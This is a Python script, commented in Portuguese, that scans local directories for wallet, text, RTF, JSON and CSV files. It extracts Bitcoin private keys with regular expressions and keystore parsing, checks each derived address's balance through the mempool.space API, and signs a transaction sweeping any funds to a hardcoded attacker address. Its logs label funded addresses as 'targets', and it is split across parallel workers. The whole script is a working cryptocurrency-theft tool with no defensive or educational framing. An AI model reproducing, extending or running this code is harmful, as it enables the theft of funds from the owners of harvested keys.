import json, re, os, requests, time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = int(os.environ.get('TOTAL_WORKERS', 10))

def create_raw_tx(wif, balance_sats):
    try:
        k = Key(wif, network='bitcoin')
        fee = 3500 
        amount = balance_sats - fee
        if amount <= 546: return None
        t = Transaction(network='bitcoin')
        t.add_input(k.address(), balance_sats)
        t.add_output(DEST_ADDRESS, amount)
        t.sign(k)
        return t.raw_hex()
    except: return None

def check_balance_and_broadcast(priv_key_str, original_addr=None):
    try:
        # Limpa espaços e caracteres invisíveis da chave
        priv_key_str = priv_key_str.strip()
        k = Key(priv_key_str, network='bitcoin')
        
        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=witness_type)
            target = original_addr if (original_addr and witness_type is None) else addr
            
            # LOG DE DEBUG: Força a exibição para você saber que está funcionando
            print(f"🔎 Worker {WORKER_ID} testando: {target}")
            
            time.sleep(0.15) 
            try:
                r = requests.get(f"https://mempool.space/api/address/{target}", timeout=10).json()
                stats = r.get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 0:
                    print(f"🚨 !!! ALVO DETECTADO: {target} | SALDO: {bal} sats !!!")
                    raw_hex = create_raw_tx(k.wif(), bal)
                    if raw_hex:
                        print(f"HEX_GEN:{raw_hex}")
                        return True
            except: continue
    except: pass
    return False

def process_file(file_path):
    print(f"📂 LENDO: {file_path}")
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
            
            # Limpeza específica para RTF
            if file_path.lower().endswith('.rtf'):
                content = re.sub(r'\{\*?\\[^{}]+\}|\\([a-z0-9]+)\s?|;', '', content)

            # 1. Extrator JSON
            if '"keystore"' in content or '"keypairs"' in content:
                try:
                    data = json.loads(content)
                    if 'keypairs' in data:
                        for addr, priv in data['keypairs'].items():
                            check_balance_and_broadcast(priv, addr)
                    if 'keystore' in data and 'xprv' in data['keystore']:
                        master = Key(data['keystore']['xprv'])
                        for i in range(100):
                            check_balance_and_broadcast(master.subkey_for_path(f"0/{i}").wif())
                except: pass
            
            # 2. Extrator Universal (WIF e HEX 64) - Agora pega CSV e TXT sujo
            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
            hex_keys = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
            
            combined = list(set(wifs + hex_keys))
            if combined:
                print(f"✅ Encontradas {len(combined)} chaves em {file_path}")
                for key in combined:
                    check_balance_and_broadcast(key)
            else:
                print(f"⚠️ Nenhuma chave detectada no formato padrão em {file_path}")
    except Exception as e:
        print(f"❌ Erro no arquivo {file_path}: {e}")

if __name__ == "__main__":
    # LISTA DE EXTENSÕES ATUALIZADA (Incluindo .csv)
    exts = ('.wallet', '.txt', '.key', '.rtf', '.json', '.csv')
    all_files = []
    for root, dirs, files in os.walk('.'):
        for f in files:
            if f.lower().endswith(exts): 
                if not root.startswith('./.'):
                    all_files.append(os.path.join(root, f))
    
    all_files = sorted(list(set(all_files)))
    my_files = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
    
    print(f"🚀 WORKER {WORKER_ID} | ARQUIVOS NESTE LOTE: {len(my_files)}")
    for f in my_files:
        process_file(f)
